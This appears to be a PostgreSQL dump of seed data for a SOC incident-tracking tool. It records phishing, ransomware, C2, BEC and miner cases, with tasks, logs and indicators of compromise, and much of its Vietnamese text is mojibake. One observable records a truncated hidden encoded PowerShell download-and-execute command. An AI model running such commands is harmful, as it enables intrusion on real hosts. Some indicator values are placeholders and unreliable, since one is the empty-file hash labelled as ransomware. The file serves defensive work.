INSERT INTO public.task_items VALUES ('f4ea1534-0a30-4114-a30d-3710ddec3719', '10000000-0000-0000-0000-000000000041', 'Reset Password user bß╗ï hß║íi', 'Completed', 'analyst1@ncsgroup.vn', 'Containment', 1, '2026-05-20 16:48:29.582962+00', '2026-05-20 18:48:29.582962+00', 'Reset mß║¡t khß║®u v├á force logout mß╗ìi session cß╗ºa 3 nh├ón sß╗▒ HR.', false, '2026-05-20 16:48:29.582962+00', NULL, '2026-05-20 18:48:29.582962+00', '{"NCS SOC",HR}');
INSERT INTO public.task_items VALUES ('b7211275-831d-44df-9645-9106fead08ab', '10000000-0000-0000-0000-000000000041', 'Kiß╗âm tra sign-in logs', 'InProgress', 'analyst1@ncsgroup.vn', 'Analysis', 2, '2026-05-20 16:48:29.582962+00', '2026-05-21 07:48:29.582962+00', 'Qu├®t lß╗ïch sß╗¡ ─æ─âng nhß║¡p ─æß╗â xem attacker ─æ├ú truy cß║¡p v├áo file n├áo chã░a.', true, '2026-05-21 02:48:29.582962+00', NULL, '2026-05-21 14:48:29.582962+00', '{"NCS SOC",HR}');
INSERT INTO public.task_items VALUES ('cd29dde1-cce4-457f-9964-bc2500fdd4e9', '10000000-0000-0000-0000-000000000042', 'Kh├│a t├ái khoß║ún VPN & AD', 'Completed', 'soc-l3@ncsgroup.vn', 'Containment', 1, '2026-05-21 08:48:29.582962+00', '2026-05-21 09:48:29.582962+00', 'Tß║ím thß╗Øi block t├ái khoß║ún cß╗ºa NVA01.', false, '2026-05-21 08:48:29.582962+00', NULL, '2026-05-21 09:48:29.582962+00', '{"NCS SOC","Internal Security"}');
INSERT INTO public.task_items VALUES ('005d4a55-14c3-4f6f-98be-0bf5e2025636', '10000000-0000-0000-0000-000000000049', 'X├│a Inbox Rule ─æß╗Öc hß║íi', 'Completed', 'soc-l3@ncsgroup.vn', 'Containment', 1, '2026-05-21 12:08:29.582962+00', '2026-05-21 12:18:29.582962+00', 'X├│a rule forward tß╗▒ ─æß╗Öng ra ngo├ái.', false, '2026-05-21 12:08:29.582962+00', NULL, '2026-05-21 12:18:29.582962+00', '{"NCS SOC",Sales}');
INSERT INTO public.task_items VALUES ('53c11523-4223-4aea-9441-c5e0c0509573', '10000000-0000-0000-0000-000000000049', 'Thu hß╗ôi Token', 'InProgress', 'soc-l3@ncsgroup.vn', 'Containment', 2, '2026-05-21 12:08:29.582962+00', '2026-05-21 12:18:29.582962+00', 'Thu hß╗ôi mß╗ìi token O365 cß╗ºa sß║┐p.', true, '2026-05-21 12:18:29.582962+00', NULL, '2026-05-21 13:48:29.582962+00', '{"NCS SOC",Sales}');


--
-- Data for Name: case_logs; Type: TABLE DATA; Schema: public; Owner: thehive
--

INSERT INTO public.case_logs VALUES ('da9b7afe-270a-44fd-b9c6-f2889195ddd2', '10000000-0000-0000-0000-000000000001', NULL, 'Alert imported from MISP. Initial URL block requested.', 'system', '2026-05-19 12:48:27.755019+00', '2026-05-19 12:48:27.755019+00', NULL, NULL);
INSERT INTO public.case_logs VALUES ('1bd1432b-d347-48f3-a6a3-54b6688e4f67', '10000000-0000-0000-0000-000000000001', NULL, 'Finance confirmed two users clicked the link; password reset review is ongoing.', 'nghia.dinh@ncsgroup.vn', '2026-05-21 12:13:27.755019+00', '2026-05-21 12:13:27.755019+00', NULL, NULL);
INSERT INTO public.case_logs VALUES ('3e0a7d51-d0ca-470b-9445-5cda12defe1c', '10000000-0000-0000-0000-000000000002', NULL, 'EDR timeline collected. Parent process is winword.exe from downloaded attachment.', 'soc-l2@ncsgroup.vn', '2026-05-21 12:28:27.755019+00', '2026-05-21 12:28:27.755019+00', NULL, NULL);
INSERT INTO public.case_logs VALUES ('7223a3b3-48e4-4ad6-998b-2f5a85099600', '10000000-0000-0000-0000-000000000003', NULL, 'Containment complete. No additional beaconing observed for 48 hours.', 'certuser@thehive.local', '2026-05-19 12:48:27.755019+00', '2026-05-19 12:48:27.755019+00', NULL, NULL);


--
-- Data for Name: observables; Type: TABLE DATA; Schema: public; Owner: thehive
--

INSERT INTO public.observables VALUES ('30000000-0000-0000-0000-000000000001', NULL, '10000000-0000-0000-0000-000000000001', 'url', 'https://login-microsoft-security.example/finance/invoice', 'Credential harvesting URL from the phishing email body.', 2, true, true, '{url,phishing,m365}', 'nghia.dinh@ncsgroup.vn', '2026-05-19 12:48:27.755019+00', '2026-05-21 12:13:27.755019+00', NULL, NULL, NULL, '{}', false, NULL, 'https://login-microsoft-security.example/finance/invoice?campaign=april&recipient=finance', 'sha256:2b4d9f54a7a2d9d843f8c9b1f2ad0b87b2a7d2d7b547a7f7aa1f9bba0d0c0001', '{"NCS SOC",Finance}');
INSERT INTO public.observables VALUES ('30000000-0000-0000-0000-000000000002', NULL, '10000000-0000-0000-0000-000000000002', 'filename', 'powershell.exe -EncodedCommand SQBFAFgA...', 'Suspicious encoded command observed in EDR process telemetry.', 2, true, false, '{powershell,endpoint,attack:T1059}', 'soc-l2@ncsgroup.vn', '2026-05-20 12:48:27.755019+00', '2026-05-21 12:30:27.755019+00', NULL, NULL, NULL, '{}', true, NULL, 'powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA...', 'sha256:2b4d9f54a7a2d9d843f8c9b1f2ad0b87b2a7d2d7b547a7f7aa1f9bba0d0c0002', '{"NCS SOC","IT Operations"}');
INSERT INTO public.observables VALUES ('30000000-0000-0000-0000-000000000003', NULL, '10000000-0000-0000-0000-000000000003', 'domain', 'cdn-update-check.example', 'Known C2 callback domain from proxy logs; blocked at proxy and DNS.', 2, true, true, '{domain,c2,resolved}', 'certuser@thehive.local', '2026-05-14 12:48:27.755019+00', '2026-05-19 12:48:27.755019+00', NULL, NULL, NULL, '{}', false, NULL, 'cdn-update-check.example', 'sha256:2b4d9f54a7a2d9d843f8c9b1f2ad0b87b2a7d2d7b547a7f7aa1f9bba0d0c0003', '{"NCS SOC","IT Operations"}');
INSERT INTO public.observables VALUES ('30000000-0000-0000-0000-000000000401', NULL, '10000000-0000-0000-0000-000000000040', 'ip', '192.168.1.55', 'IP m├íy chß╗º kß║┐ to├ín bß╗ï l├óy nhiß╗àm', 2, false, true, '{internal-ip}', 'soc-l2@ncsgroup.vn', '2026-05-21 11:48:29.582962+00', '2026-05-21 11:48:29.582962+00', NULL, NULL, NULL, '{}', false, NULL, '192.168.1.55', 'sha256:de8838000814009fc32142e4121a9599df8aa9d69ffbb72f7b9ecbb677904e82', '{"NCS SOC",Finance}');
INSERT INTO public.observables VALUES ('30000000-0000-0000-0000-000000000402', NULL, '10000000-0000-0000-0000-000000000040', 'hash', 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', 'SHA256 cß╗ºa file m├ú ─æß╗Öc ransomware', 2, true, true, '{malware,ransomware}', 'soc-l2@ncsgroup.vn', '2026-05-21 11:48:29.582962+00', '2026-05-21 11:48:29.582962+00', NULL, NULL, NULL, '{}', false, NULL, 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', 'sha256:cd372fb85148700fa88095e3492d3f9f5beb43e555e5ff26d95f5a6adc36f8e6', '{"NCS SOC",Finance}');
INSERT INTO public.observables VALUES ('30000000-0000-0000-0000-000000000403', NULL, '10000000-0000-0000-0000-000000000040', 'domain', 'c2.malicious-domain.xyz', 'Domain nhß║¡n kß║┐t nß╗æi C2 tß╗½ malware', 2, true, false, '{c2}', 'soc-l2@ncsgroup.vn', '2026-05-21 11:48:29.582962+00', '2026-05-21 11:48:29.582962+00', NULL, NULL, NULL, '{}', false, NULL, 'c2.malicious-domain.xyz', 'sha256:dccd4ee6dff5f4d73f65326544ae578cbc2f4516611043929d45b01cccafbb5a', '{"NCS SOC",Finance}');
INSERT INTO public.observables VALUES ('30000000-0000-0000-0000-000000000411', NULL, '10000000-0000-0000-0000-000000000041', 'url', 'http://hr-salary-update.ncsgroup.xyz/login', 'Link lß╗½a ─æß║úo ─æ─âng nhß║¡p M365', 2, true, true, '{phishing,url}', 'analyst1@ncsgroup.vn', '2026-05-20 16:48:29.582962+00', '2026-05-20 16:48:29.582962+00', NULL, NULL, NULL, '{}', false, NULL, 'http://hr-salary-update.ncsgroup.xyz/login', 'sha256:4e3191f9d4fd85a8f04598ac10e8a5b74fa51d47000b020c936e004e46dab5cd', '{"NCS SOC",HR}');
INSERT INTO public.observables VALUES ('30000000-0000-0000-0000-000000000412', NULL, '10000000-0000-0000-0000-000000000041', 'mail', 'admin@hr-salary-update.ncsgroup.xyz', 'Email sender mß║ío danh bß╗Ö phß║¡n HR', 2, true, true, '{sender}', 'analyst1@ncsgroup.vn', '2026-05-20 16:48:29.582962+00', '2026-05-20 16:48:29.582962+00', NULL, NULL, NULL, '{}', false, NULL, 'admin@hr-salary-update.ncsgroup.xyz', 'sha256:341586b8fe3eabbe54a63582a51c18c99ed4c99c02e2d20ddf65c313fb4a8afc', '{"NCS SOC",HR}');
INSERT INTO public.observables VALUES ('30000000-0000-0000-0000-000000000421', NULL, '10000000-0000-0000-0000-000000000042', 'filename', 'Q1-Finance-Report_Confidential.zip', 'File ZIP chß╗®a dß╗» liß╗çu nhß║íy cß║úm tß║úi l├¬n OneDrive', 3, false, true, '{sensitive-data}', 'soc-l3@ncsgroup.vn', '2026-05-21 08:48:29.582962+00', '2026-05-21 08:48:29.582962+00', NULL, NULL, NULL, '{}', false, NULL, 'Q1-Finance-Report_Confidential.zip', 'sha256:fcca0f47cf488ab236c2951ab53df9545f7a98cebae1165f66bbaec42ef01fea', '{"NCS SOC","Internal Security"}');
INSERT INTO public.observables VALUES ('30000000-0000-0000-0000-000000000422', NULL, '10000000-0000-0000-0000-000000000042', 'user-agent', 'OneDriveClient/23.012', 'ß╗¿ng dß╗Ñng d├╣ng ─æß╗â tß║úi dß╗» liß╗çu l├¬n', 2, false, false, '{app}', 'soc-l3@ncsgroup.vn', '2026-05-21 08:48:29.582962+00', '2026-05-21 08:48:29.582962+00', NULL, NULL, NULL, '{}', false, NULL, 'OneDriveClient/23.012', 'sha256:e70c54bfe4791a2bc8468c8f5ca9785e0d837c5c0ecb8a6d4ab1652b30c957d4', '{"NCS SOC","Internal Security"}');
INSERT INTO public.observables VALUES ('30000000-0000-0000-0000-000000000441', NULL, '10000000-0000-0000-0000-000000000044', 'ip', '114.114.114.114', 'IP thß╗▒c hiß╗çn tß║Ñn c├┤ng Brute force VPN', 2, true, true, '{attacker-ip}', 'soc-l2@ncsgroup.vn', '2026-05-21 12:23:29.582962+00', '2026-05-21 12:23:29.582962+00', NULL, NULL, NULL, '{}', false, NULL, '114.114.114.114', 'sha256:802fea7218cb4797a4870ce3b2b15d6e040037853deb20d74078fb8cfeadb31a', '{"NCS SOC","IT Operations"}');
INSERT INTO public.observables VALUES ('30000000-0000-0000-0000-000000000451', NULL, '10000000-0000-0000-0000-000000000045', 'hash', 'c2b53b8f52afab92b6a07e923838274d', 'MD5 cß╗ºa xmrig miner', 2, true, true, '{miner}', 'soc-l1@ncsgroup.vn', '2026-05-17 12:48:29.582962+00', '2026-05-17 12:48:29.582962+00', NULL, NULL, NULL, '{}', false, NULL, 'c2b53b8f52afab92b6a07e923838274d', 'sha256:8e6e40650dfa70882c985be67f609b3c2cf5c9cffba7a6858cccc3bebad747cb', '{"NCS SOC",DevOps}');
INSERT INTO public.observables VALUES ('30000000-0000-0000-0000-000000000461', NULL, '10000000-0000-0000-0000-000000000046', 'domain', 'api.update-windows.xyz', 'Cobalt Strike C2 server', 2, true, true, '{cobalt-strike,c2}', 'soc-l2@ncsgroup.vn', '2026-05-21 03:48:29.582962+00', '2026-05-21 03:48:29.582962+00', NULL, NULL, NULL, '{}', false, NULL, 'api.update-windows.xyz', 'sha256:6839cdda212e2f2c70fcc4f88e6aeba7e316ae16fe5503e19ce8f04ba1beeb54', '{"NCS SOC",Finance}');
INSERT INTO public.observables VALUES ('30000000-0000-0000-0000-000000000491', NULL, '10000000-0000-0000-0000-000000000049', 'mail', 'attacker-drop@gmail.com', 'Email nhß║¡n bß║ún forward (Rule BEC)', 2, true, true, '{bec-destination}', 'soc-l3@ncsgroup.vn', '2026-05-21 11:58:29.582962+00', '2026-05-21 11:58:29.582962+00', NULL, NULL, NULL, '{}', false, NULL, 'attacker-drop@gmail.com', 'sha256:24ecb37bbecf81ff0a8e02fc42702ea2826d52a393299b50b615e869e834322a', '{"NCS SOC",Sales}');


--
-- Data for Name: attachments; Type: TABLE DATA; Schema: public; Owner: thehive
--



--
-- Data for Name: attack_patterns; Type: TABLE DATA; Schema: public; Owner: thehive
--



--
-- Data for Name: audit_logs; Type: TABLE DATA; Schema: public; Owner: thehive
--

INSERT INTO public.audit_logs VALUES ('c02e77af-a75e-49de-91b3-3bd2ec852536', NULL, 'Create', 'case', '10000000-0000-0000-0000-000000000040', NULL, '{"title": "Ph├ít hiß╗çn m├ú ─æß╗Öc Ransomware m├ú h├│a dß╗» liß╗çu tr├¬n Server kß║┐ to├ín"}', NULL, NULL, NULL, '2026-05-21 10:48:29.582962+00');
INSERT INTO public.audit_logs VALUES ('7d978992-82de-40fd-af96-dcd290be9f28', NULL, 'Update', 'case', '10000000-0000-0000-0000-000000000040', NULL, '{"status": "Open", "assignee": "soc-l2@ncsgroup.vn"}', NULL, NULL, NULL, '2026-05-21 11:03:29.582962+00');
INSERT INTO public.audit_logs VALUES ('2efbefbd-c65a-4d66-b4fc-e395fb631145', NULL, 'Create', 'task', '10000000-0000-0000-0000-000000000040', NULL, '{"title": "C├┤ lß║¡p m├íy chß╗º bß╗ï nhiß╗àm"}', NULL, NULL, NULL, '2026-05-21 11:18:29.582962+00');
INSERT INTO public.audit_logs VALUES ('5cda151c-c6c3-4000-ba81-ef15c4777ca4', NULL, 'Update', 'task', '10000000-0000-0000-0000-000000000040', NULL, '{"status": "Completed"}', NULL, NULL, NULL, '2026-05-21 12:03:29.582962+00');
INSERT INTO public.audit_logs VALUES ('6c02b3ff-0da6-4d30-90f7-acd98320d8b3', NULL, 'Create', 'case', '10000000-0000-0000-0000-000000000041', NULL, '{"title": "Chiß║┐n dß╗ïch Phishing nhß║»m v├áo bß╗Ö phß║¡n H├ánh ch├¡nh Nh├ón sß╗▒"}', NULL, NULL, NULL, '2026-05-20 12:48:29.582962+00');
INSERT INTO public.audit_logs VALUES ('f4c3992c-b63b-487d-acb6-d94d411c4cfd', NULL, 'Update', 'case', '10000000-0000-0000-0000-000000000041', NULL, '{"status": "InProgress"}', NULL, NULL, NULL, '2026-05-20 16:48:29.582962+00');


--
-- Data for Name: auth_sessions; Type: TABLE DATA; Schema: public; Owner: thehive
--



--
-- Data for Name: case_procedures; Type: TABLE DATA; Schema: public; Owner: thehive
--

INSERT INTO public.case_procedures VALUES ('dddb4bd0-332d-46c1-8d92-798fdc32c530', '10000000-0000-0000-0000-000000000001', 'Credential phishing lure delivered through email with fake Microsoft 365 login page.', 'T1566.002', 'Phishing: Spearphishing Link', 'Initial Access', '2026-05-19 12:48:27.755019+00', 'nghia.dinh@ncsgroup.vn', '2026-05-19 12:48:27.755019+00', '2026-05-21 12:13:27.755019+00');
INSERT INTO public.case_procedures VALUES ('0aa5ec55-aa68-4ed1-bd36-b59db570fccf', '10000000-0000-0000-0000-000000000002', 'User execution triggered Office child process and encoded PowerShell.', 'T1059.001', 'Command and Scripting Interpreter: PowerShell', 'Execution', '2026-05-20 12:48:27.755019+00', 'soc-l2@ncsgroup.vn', '2026-05-20 12:48:27.755019+00', '2026-05-21 12:30:27.755019+00');
INSERT INTO public.case_procedures VALUES ('21a85fb8-94e9-47e2-b853-934739714f20', '10000000-0000-0000-0000-000000000003', 'Compromised host attempted C2 beacon over HTTPS to known domain.', 'T1071.001', 'Application Layer Protocol: Web Protocols', 'Command and Control', '2026-05-14 12:48:27.755019+00', 'certuser@thehive.local', '2026-05-14 12:48:27.755019+00', '2026-05-19 12:48:27.755019+00');


--
-- Data for Name: case_shares; Type: TABLE DATA; Schema: public; Owner: thehive
--

INSERT INTO public.case_shares VALUES ('f8cd3360-a065-4b11-ac6a-d10995e2dd42', '10000000-0000-0000-0000-000000000001', 'NCS SOC', 'admin', 'auto', 'auto', 'system', '2026-05-19 12:48:27.755019+00', '2026-05-21 12:13:27.755019+00', true, true, false);
INSERT INTO public.case_shares VALUES ('e690d9b8-13de-4905-b900-f5c2ae14b56c', '10000000-0000-0000-0000-000000000001', 'Finance', 'read-only', 'manual', 'auto', 'nghia.dinh@ncsgroup.vn', '2026-05-19 12:48:27.755019+00', '2026-05-21 12:13:27.755019+00', false, true, false);
INSERT INTO public.case_shares VALUES ('a20116ed-016a-4b82-bd24-6d83fc78ae78', '10000000-0000-0000-0000-000000000002', 'NCS SOC', 'admin', 'auto', 'auto', 'system', '2026-05-20 12:48:27.755019+00', '2026-05-21 12:30:27.755019+00', true, true, false);
INSERT INTO public.case_shares VALUES ('5820c857-72dc-4837-93cf-373271af625c', '10000000-0000-0000-0000-000000000002', 'IT Operations', 'read-only', 'manual', 'auto', 'soc-l2@ncsgroup.vn', '2026-05-20 12:48:27.755019+00', '2026-05-21 12:30:27.755019+00', false, true, false);
INSERT INTO public.case_shares VALUES ('9edcffd2-0a78-47cf-8f45-9567c826155d', '10000000-0000-0000-0000-000000000003', 'NCS SOC', 'admin', 'auto', 'auto', 'system', '2026-05-14 12:48:27.755019+00', '2026-05-19 12:48:27.755019+00', true, false, false);


--
-- Data for Name: case_templates; Type: TABLE DATA; Schema: public; Owner: thehive
--



--
-- Data for Name: case_template_custom_fields; Type: TABLE DATA; Schema: public; Owner: thehive
--



--
-- Data for Name: case_template_tasks; Type: TABLE DATA; Schema: public; Owner: thehive
--



--
-- Data for Name: cortex_analyzer_catalog; Type: TABLE DATA; Schema: public; Owner: thehive
--

INSERT INTO public.cortex_analyzer_catalog VALUES ('287db980-3a59-4819-a001-4a0b316c3703', 'placeholder', 'Placeholder Analyzer', '0.1.0-migration', '{domain,ip,url,hash,mail,filename}', true, '2026-05-21 12:48:27.077535+00', '2026-05-21 12:48:27.077535+00');


--
-- Data for Name: cortex_jobs; Type: TABLE DATA; Schema: public; Owner: thehive
--



--
-- Data for Name: custom_field_definitions; Type: TABLE DATA; Schema: public; Owner: thehive
--



--
-- Data for Name: custom_fields; Type: TABLE DATA; Schema: public; Owner: thehive
--



--
-- Data for Name: dashboards; Type: TABLE DATA; Schema: public; Owner: thehive
--



--
-- Data for Name: data_migrations; Type: TABLE DATA; Schema: public; Owner: thehive
--



--
-- Data for Name: feature_flags; Type: TABLE DATA; Schema: public; Owner: thehive
--



--
-- Data for Name: iocs; Type: TABLE DATA; Schema: public; Owner: thehive
--



--
-- Data for Name: misp_servers; Type: TABLE DATA; Schema: public; Owner: thehive
--



--
-- Data for Name: misp_sync_log; Type: TABLE DATA; Schema: public; Owner: thehive
--



--
-- Data for Name: notification_configs; Type: TABLE DATA; Schema: public; Owner: thehive
--



--
-- Data for Name: notification_queue; Type: TABLE DATA; Schema: public; Owner: thehive
--



--
-- Data for Name: notification_delivery_log; Type: TABLE DATA; Schema: public; Owner: thehive
--



--
-- Data for Name: observable_types; Type: TABLE DATA; Schema: public; Owner: thehive
--

INSERT INTO public.observable_types VALUES ('ip', false, '2026-05-21 12:48:27.978613+00');
INSERT INTO public.observable_types VALUES ('domain', false, '2026-05-21 12:48:27.978613+00');
INSERT INTO public.observable_types VALUES ('url', false, '2026-05-21 12:48:27.978613+00');
INSERT INTO public.observable_types VALUES ('mail', false, '2026-05-21 12:48:27.978613+00');
INSERT INTO public.observable_types VALUES ('hash', false, '2026-05-21 12:48:27.978613+00');
INSERT INTO public.observable_types VALUES ('filename', false, '2026-05-21 12:48:27.978613+00');
INSERT INTO public.observable_types VALUES ('fqdn', false, '2026-05-21 12:48:27.978613+00');
INSERT INTO public.observable_types VALUES ('uri_path', false, '2026-05-21 12:48:27.978613+00');
INSERT INTO public.observable_types VALUES ('user-agent', false, '2026-05-21 12:48:27.978613+00');
INSERT INTO public.observable_types VALUES ('regexp', false, '2026-05-21 12:48:27.978613+00');
INSERT INTO public.observable_types VALUES ('other', false, '2026-05-21 12:48:27.978613+00');
INSERT INTO public.observable_types VALUES ('file', true, '2026-05-21 12:48:27.978613+00');
INSERT INTO public.observable_types VALUES ('registry', false, '2026-05-21 12:48:27.978613+00');
INSERT INTO public.observable_types VALUES ('autonomous-system', false, '2026-05-21 12:48:27.978613+00');
INSERT INTO public.observable_types VALUES ('hostname', false, '2026-05-21 12:48:27.978613+00');


--
-- Data for Name: outbox_events; Type: TABLE DATA; Schema: public; Owner: thehive
--



--
-- Data for Name: pages; Type: TABLE DATA; Schema: public; Owner: thehive
--



--
-- Data for Name: password_reset_tokens; Type: TABLE DATA; Schema: public; Owner: thehive
--



--
-- Data for Name: schema_migrations; Type: TABLE DATA; Schema: public; Owner: thehive
--

INSERT INTO public.schema_migrations VALUES (41, false);


--
-- Data for Name: search_outbox; Type: TABLE DATA; Schema: public; Owner: thehive
--

INSERT INTO public.search_outbox VALUES ('566ddc48-3310-4ec1-9997-27584381fda2', 'cases', '10000000-0000-0000-0000-000000000040', 'index', 'done', '', '2026-05-21 12:48:29.582962+00', '2026-05-21 12:49:01.634696+00');
INSERT INTO public.search_outbox VALUES ('4e5f88c7-ef46-4bbe-8bf3-dd47ee265432', 'cases', '10000000-0000-0000-0000-000000000041', 'index', 'done', '', '2026-05-21 12:48:29.582962+00', '2026-05-21 12:49:01.674925+00');
INSERT INTO public.search_outbox VALUES ('0eb16a50-67b4-499e-b20a-24ae7502a38b', 'cases', '10000000-0000-0000-0000-000000000042', 'index', 'done', '', '2026-05-21 12:48:29.582962+00', '2026-05-21 12:49:01.709557+00');
INSERT INTO public.search_outbox VALUES ('ac8491c4-030d-4e64-9021-8167990caf89', 'cases', '10000000-0000-0000-0000-000000000043', 'index', 'done', '', '2026-05-21 12:48:29.582962+00', '2026-05-21 12:49:01.739404+00');
INSERT INTO public.search_outbox VALUES ('dc083dc2-2417-45b8-af5d-ca917bb3afb7', 'cases', '10000000-0000-0000-0000-000000000044', 'index', 'done', '', '2026-05-21 12:48:29.582962+00', '2026-05-21 12:49:01.770549+00');
INSERT INTO public.search_outbox VALUES ('7ff00ddb-3285-4cb6-8899-4c1f13e22759', 'cases', '10000000-0000-0000-0000-000000000045', 'index', 'done', '', '2026-05-21 12:48:29.582962+00', '2026-05-21 12:49:01.801385+00');
INSERT INTO public.search_outbox VALUES ('e4a104b7-a861-4288-8037-fd992f052dbf', 'cases', '10000000-0000-0000-0000-000000000046', 'index', 'done', '', '2026-05-21 12:48:29.582962+00', '2026-05-21 12:49:01.835439+00');
INSERT INTO public.search_outbox VALUES ('0b3c0b18-1525-4d3a-9af1-8c599411d503', 'cases', '10000000-0000-0000-0000-000000000047', 'index', 'done', '', '2026-05-21 12:48:29.582962+00', '2026-05-21 12:49:01.869448+00');
INSERT INTO public.search_outbox VALUES ('a6870698-f901-4ee0-acde-0eed653609c0', 'cases', '10000000-0000-0000-0000-000000000048', 'index', 'done', '', '2026-05-21 12:48:29.582962+00', '2026-05-21 12:49:01.898764+00');
INSERT INTO public.search_outbox VALUES ('18786f58-a1b5-459a-b23a-bf675097e521', 'cases', '10000000-0000-0000-0000-000000000049', 'index', 'done', '', '2026-05-21 12:48:29.582962+00', '2026-05-21 12:49:01.92729+00');
INSERT INTO public.search_outbox VALUES ('99fba29d-61b1-4c6f-8b33-4c2dd7e7e657', 'observables', '30000000-0000-0000-0000-000000000401', 'index', 'done', '', '2026-05-21 12:48:29.582962+00', '2026-05-21 12:49:01.966532+00');
INSERT INTO public.search_outbox VALUES ('833db80c-0858-4470-86e0-96f8fdf6c1e7', 'observables', '30000000-0000-0000-0000-000000000402', 'index', 'done', '', '2026-05-21 12:48:29.582962+00', '2026-05-21 12:49:01.992632+00');
INSERT INTO public.search_outbox VALUES ('b494d4e9-5756-46f2-a7f4-cfaa4eedd5b6', 'observables', '30000000-0000-0000-0000-000000000403', 'index', 'done', '', '2026-05-21 12:48:29.582962+00', '2026-05-21 12:49:02.019962+00');
INSERT INTO public.search_outbox VALUES ('22dfbb64-4d71-4066-80e8-4a83ce528245', 'observables', '30000000-0000-0000-0000-000000000411', 'index', 'done', '', '2026-05-21 12:48:29.582962+00', '2026-05-21 12:49:02.049237+00');
INSERT INTO public.search_outbox VALUES ('d53cc5f7-295e-44f5-aa92-d276d49698d0', 'observables', '30000000-0000-0000-0000-000000000412', 'index', 'done', '', '2026-05-21 12:48:29.582962+00', '2026-05-21 12:49:02.077389+00');
INSERT INTO public.search_outbox VALUES ('e046030c-82b8-4ad5-902c-b93e7b320ec8', 'observables', '30000000-0000-0000-0000-000000000421', 'index', 'done', '', '2026-05-21 12:48:29.582962+00', '2026-05-21 12:49:02.104351+00');
INSERT INTO public.search_outbox VALUES ('b50a1d54-3c5e-474c-85ad-4ce5d1ccff25', 'observables', '30000000-0000-0000-0000-000000000422', 'index', 'done', '', '2026-05-21 12:48:29.582962+00', '2026-05-21 12:49:02.129531+00');
INSERT INTO public.search_outbox VALUES ('95eca008-84ad-4e6e-88fe-fdd4307aedf1', 'observables', '30000000-0000-0000-0000-000000000441', 'index', 'done', '', '2026-05-21 12:48:29.582962+00', '2026-05-21 12:49:02.153407+00');
INSERT INTO public.search_outbox VALUES ('c4191518-2691-46ed-842f-4f01fd6272fc', 'observables', '30000000-0000-0000-0000-000000000451', 'index', 'done', '', '2026-05-21 12:48:29.582962+00', '2026-05-21 12:49:02.176795+00');
INSERT INTO public.search_outbox VALUES ('719c48ca-691f-4df3-95cf-d2442d11464c', 'observables', '30000000-0000-0000-0000-000000000461', 'index', 'done', '', '2026-05-21 12:48:29.582962+00', '2026-05-21 12:49:02.201812+00');
INSERT INTO public.search_outbox VALUES ('1d63b82a-b0a2-4775-bb40-1834fb786809', 'observables', '30000000-0000-0000-0000-000000000491', 'index', 'done', '', '2026-05-21 12:48:29.582962+00', '2026-05-21 12:49:02.228266+00');
INSERT INTO public.search_outbox VALUES ('9bdd0e41-4b89-4b7d-947b-4c4a78d28f18', 'tasks', 'd2e678c9-bb6e-4994-9220-7299ec8c53c5', 'index', 'done', '', '2026-05-21 12:48:29.582962+00', '2026-05-21 12:49:02.265524+00');
INSERT INTO public.search_outbox VALUES ('fa3e0ce5-50fa-4b7b-b982-d810dc8c4e9c', 'tasks', '0f03627e-5d9c-4642-9321-7267508a6912', 'index', 'done', '', '2026-05-21 12:48:29.582962+00', '2026-05-21 12:49:02.292305+00');
INSERT INTO public.search_outbox VALUES ('bcedffa3-fee8-4544-98b7-cce92dd1dce8', 'tasks', 'de21492c-317b-4e4e-9411-0dc351d52d76', 'index', 'done', '', '2026-05-21 12:48:29.582962+00', '2026-05-21 12:49:02.317723+00');
INSERT INTO public.search_outbox VALUES ('17f61e28-989d-4d65-a50a-eae25367a8a7', 'tasks', 'f4ea1534-0a30-4114-a30d-3710ddec3719', 'index', 'done', '', '2026-05-21 12:48:29.582962+00', '2026-05-21 12:49:02.342172+00');
INSERT INTO public.search_outbox VALUES ('9d6d6c74-6f8e-4a9f-bfdc-06d431437d58', 'tasks', 'b7211275-831d-44df-9645-9106fead08ab', 'index', 'done', '', '2026-05-21 12:48:29.582962+00', '2026-05-21 12:49:02.36867+00');
INSERT INTO public.search_outbox VALUES ('440c74fd-973f-4bf6-9135-35b954655cf0', 'tasks', 'cd29dde1-cce4-457f-9964-bc2500fdd4e9', 'index', 'done', '', '2026-05-21 12:48:29.582962+00', '2026-05-21 12:49:02.3931+00');
INSERT INTO public.search_outbox VALUES ('afdab82a-177c-4880-831e-507df41bbd53', 'tasks', '005d4a55-14c3-4f6f-98be-0bf5e2025636', 'index', 'done', '', '2026-05-21 12:48:29.582962+00', '2026-05-21 12:49:02.418112+00');
INSERT INTO public.search_outbox VALUES ('808bdb3e-d673-4c32-b380-3d90fcbea41b', 'tasks', '53c11523-4223-4aea-9441-c5e0c0509573', 'index', 'done', '', '2026-05-21 12:48:29.582962+00', '2026-05-21 12:49:02.442754+00');


--
-- Data for Name: tags; Type: TABLE DATA; Schema: public; Owner: thehive
--



--
-- Data for Name: taxonomies; Type: TABLE DATA; Schema: public; Owner: thehive
--



--
-- Data for Name: taxonomy_predicates; Type: TABLE DATA; Schema: public; Owner: thehive
--



--
-- Data for Name: taxonomy_entries; Type: TABLE DATA; Schema: public; Owner: thehive
--



--
-- Data for Name: ui_settings; Type: TABLE DATA; Schema: public; Owner: thehive
--

INSERT INTO public.ui_settings VALUES ('hideEmptyCaseButton', 'false', '2026-05-21 12:48:29.074059+00', '2026-05-21 12:48:29.074059+00');
INSERT INTO public.ui_settings VALUES ('smtp_config', '{"from": "", "host": "", "pass": "", "port": 587, "user": "", "enabled": false}', '2026-05-21 12:48:29.503637+00', '2026-05-21 12:48:29.503637+00');


--
-- PostgreSQL database dump complete
--

\unrestrict l0tckmDlpyh4dWRef1fYLGju5SxghtcSTq4r36pc5fekfZr2ZaZbRf8bexODsmA

